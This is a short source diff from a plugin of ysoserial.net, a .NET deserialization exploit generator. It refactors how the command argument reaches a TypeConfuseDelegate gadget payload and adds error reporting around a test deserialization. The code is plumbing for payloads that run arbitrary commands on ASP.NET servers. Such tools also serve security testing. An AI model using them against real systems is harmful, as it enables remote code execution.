@@ -65,7 +65,7 @@ namespace ysoserial.Plugins
             try
             {
                 extra = options.Parse(args);
-                inputArgs.CmdFullString = command;
+                inputArgs.Cmd = command;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
                 inputArgs.Test = test;
@@ -92,7 +92,7 @@ namespace ysoserial.Plugins
                 /* I decided to change the TypeConfuseDelegateGenerator class and use its gadget instead of doing this through the following hacky way */
 
                 /* hacky way begin
-                byte[] tempPayload_init = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false);
+                byte[] tempPayload_init = (byte[])new TypeConfuseDelegateGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
                 byte[] tempPayload = new byte[tempPayload_init.Length + 1]; // adding one byte initially to fix the length problem
                 tempPayload_init.CopyTo(tempPayload, 0);
                 System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
@@ -147,7 +147,10 @@ namespace ysoserial.Plugins
                         BinaryReader binReader = new BinaryReader(stream);
                         System.Web.HttpStaticObjectsCollection test = System.Web.HttpStaticObjectsCollection.Deserialize(binReader);
                     }
-                    catch { }
+                    catch (Exception err)
+                    {
+                        Debugging.ShowErrors(inputArgs, err);
+                    }
                 }
             }
 
